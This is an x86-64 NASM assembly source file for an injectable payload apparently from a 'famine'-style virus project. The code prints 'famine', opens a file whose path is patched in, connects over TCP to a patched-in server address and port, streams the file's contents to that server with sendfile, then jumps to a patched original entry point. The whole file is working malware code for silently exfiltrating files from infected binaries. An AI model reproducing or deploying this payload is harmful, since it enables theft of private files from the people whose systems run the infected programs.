[BITS 64]

global _payload
global _payload_size

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

%macro POPS 1-*
%rep %0
	pop rax
	%rotate 1
%endrep
%endmacro

section .text

_payload:
	pushx rax, rdi, rsi, rdx, r10

	; sys_write
	mov rax, 1
	mov	rdi, rax
	lea	rsi, [rel .msg]
	mov	rdx, 7
	syscall
	
	; Open the file
	mov rax, 2					; syscall number for open
	lea rdi, [rel FILEPATH]		; filename
	mov rsi, 0					; flags (O_RDONLY)
	syscall
	cmp rax, -1
	jl .clean
	mov r12, rax

	; stat the file
	mov rax, 4					; syscall number for stat
	lea rdi, [rel FILEPATH]		; filename
	lea rsi, [rel STATBUFFER]	; stat buffer
	syscall
	cmp rax, -1
	je .clean

	jmp .connect

.msg	db "famine", 0x0a, 0

.connect:
	; Create the socket
	mov rax, 41					; syscall number for socket
	mov rdi, 2					; domain (AF_INET)
	mov rsi, 1					; type (SOCK_STREAM)
	mov rdx, 0					; protocol
	syscall
	cmp rax, -1
	je .clean
	mov r13, rax

	; Prepare sockaddr_in structure
	mov word [rel CONNECT_BUFFER], 2          ; sin_family (AF_INET)
	movzx rax, word [rel SERVER_PORT]
	mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
	mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
	
	; Connect the socket
	mov rax, 42						; syscall number for connect
	mov rdi, r13					; socket file descriptor
	lea rsi, [rel CONNECT_BUFFER]	; pointer to sockaddr_in
	mov rdx, 16						; size of sockaddr_in
	syscall
	cmp rax, -1
	je .clean

	; Send the file
	mov rax, 40						; syscall number for sendfile
	mov rdi, r13					; socket file descriptor
	mov rsi, r12					; file descriptor
	xor rdx, rdx					; offset (NULL)
	mov r10, [rel STATBUFFER + 48]	; size
	syscall

	jmp .clean

.clean:
	; Close the file
	mov rax, 3					; syscall number for close
	mov rdi, r12				; file descriptor
	syscall

	; Close the socket
	mov rax, 3					; syscall number for close
	mov rdi, r13				; file descriptor
	syscall

	popx rax, rdi, rsi, rdx, r10
	jmp     [rel 0x0]
	; ret

STATBUFFER:		times 144 db 0
CONNECT_BUFFER:	times 16 db 0
FILEPATH:		times 1024 db 0
SERVER_PORT:	dd 0x0
SERVER_ADDR:	dw 0x4242
_payload_size:	dq $-_payload